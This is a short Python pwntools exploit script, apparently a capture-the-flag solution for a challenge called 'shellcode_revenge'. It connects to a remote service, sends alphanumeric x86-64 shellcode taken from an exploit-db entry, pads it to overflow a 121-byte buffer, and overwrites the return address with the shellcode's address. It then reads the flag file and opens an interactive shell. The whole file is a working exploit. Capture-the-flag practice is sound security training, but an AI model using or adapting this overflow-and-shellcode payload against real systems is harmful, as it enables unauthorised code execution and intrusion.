from pwn import *

context.arch = 'amd64'
local = False
if local:
    r = process('./shellcode_revenge')
else:
    r = remote('140.115.59.7', 11011)

# ref: https://www.exploit-db.com/exploits/35205/
shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
shellcode_addr = 0x6010c0
payload = shellcode + 'a' * (121 - len(shellcode)) + p64(shellcode_addr)

r.sendline(payload)
r.sendline('cat /home/shellcode_revenge++/flag')
r.interactive()
